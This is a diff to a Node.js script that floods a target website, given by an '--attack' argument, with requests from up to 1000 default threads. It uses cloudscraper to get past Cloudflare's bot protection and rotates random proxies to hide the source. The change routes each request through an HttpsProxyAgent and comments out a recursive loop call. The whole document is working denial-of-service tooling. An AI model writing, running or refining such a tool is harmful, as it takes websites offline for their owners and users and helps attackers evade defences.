@@ -1,14 +1,14 @@
 'use strict';
-
+var HttpsProxyAgent = require('https-proxy-agent');
 const cloudscraper = require('cloudscraper');
 const args = require('minimist')(process.argv.slice(2));
 const fs = require('fs');
+
 const site = args['attack'];
 const threads = args['threads'] || 1000;
 const proxy = args['proxy'] == "true";
 const updateproxy = args['updateproxy'] == "true";
 const checkproxy = true;
-
 let globalProxies = [];
 let useProxy = false;
 
@@ -34,8 +34,9 @@ function createThread() {
 
       if (useProxy) {
         let index = getRandomInt(globalProxies.length);
-        options.proxy = globalProxies[index];
-        options.tunnel = true;
+        // options.proxy = globalProxies[index];
+        // options.tunnel = false;
+        options.agent = new HttpsProxyAgent(globalProxies[index]);
       }
       cloudscraper.get(options, function (error, response, body) {
         if (error) {
@@ -62,7 +63,7 @@ async function infiniteThread() {
   // } catch (e) {
   // }
 
-  infiniteThread();
+  // infiniteThread();
 }
 
 async function loadProxies() {
